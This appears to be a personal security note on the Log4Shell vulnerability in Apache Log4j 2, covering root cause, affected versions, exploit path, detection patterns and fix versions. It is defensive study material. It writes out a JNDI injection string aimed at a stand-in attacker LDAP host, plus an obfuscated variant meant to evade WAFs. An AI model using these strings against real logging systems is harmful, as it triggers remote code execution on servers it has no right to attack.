# Log4Shell — CVE-2021-44228

**Noted:** 2026-11-06
**Component:** Apache Log4j 2 (`log4j-core`)
**Class:** JNDI injection → remote code execution
**CVSS:** 10.0

## One line

Log4j 2 evaluates `${...}` lookups inside log messages. If an attacker controls any string that ends up in a log line, a `${jndi:...}` lookup can make the logger fetch code from a server the attacker owns.

## Root cause

`log4j-core` supports *lookup substitution* in messages — `${java:version}`, `${env:HOME}`, and so on. Message lookups are evaluated at log time, on whatever string reaches the logger: user agent, username, URL path, email address, a failed login attempt.

`JndiLookup` is one of those lookups. It resolves a JNDI name, and for LDAP or RMI that name can point at a remote server:

```
${jndi:ldap://attacker.example/a}
```

The client connects out, receives a reference back, and — depending on JDK version and flags — loads a remote class or deserialises an object. Even with `trustURLCodebase=false`, LDAP responses can still be aimed at deserialisation gadgets already on the classpath.

## Affected

- `org.apache.logging.log4j:log4j-core` 2.0-beta9 through 2.14.1
- Java 6/7 backports: 2.3.x before 2.3.1, 2.12.x before 2.12.3

## Exploit path

1. The application logs attacker-controlled input at any level — `debug` counts if debug is on
2. The input contains `${jndi:ldap://.../a}`, often obfuscated as `${${lower:j}ndi:...}` to dodge WAF patterns
3. The lookup resolves during logging, producing an outbound LDAP/RMI/DNS request
4. The response delivers a payload; class loading or deserialisation executes it

## Detection

- **Logs:** grep for `${jndi:` and for `${` followed by `lower:` or `upper:` in request-derived fields
- **Network:** outbound LDAP (389), RMI (1099), and unusual DNS from application hosts — the highest-signal control in real incidents
- **Post-exploitation:** child processes spawned by the JVM (`curl`, `wget`, `bash`), unexpected `Runtime.exec` chains

## Fix

| version | change |
| --- | --- |
| 2.15.0 | JNDI lookups restricted to a safe list; **incomplete** (CVE-2021-45046, DoS) |
| 2.16.0 | message lookups removed entirely; JNDI disabled by default |
| 2.17.0 | fixed DoS (CVE-2021-45105) |
| 2.17.1 / 2.12.4 / 2.3.2 | later fixes (CVE-2021-44832, CVE-2021-45105) |

Interim mitigations still seen in the wild:

- `-Dlog4j2.formatMsgNoLookups=true` (2.10+; no-op from 2.16)
- remove `JndiLookup.class` from `log4j-core.jar`
- block outbound LDAP/RMI from application subnets

## What I took from it

- "It is just a logger" is not a trust boundary. Any library that *interprets* its input is an injection sink.
- The control that mattered most in real incidents was **egress filtering**, not patch speed.
- WAF signatures arrived late and were trivially bypassed. Detection has to live in logs and egress, not in regexes on the way in.
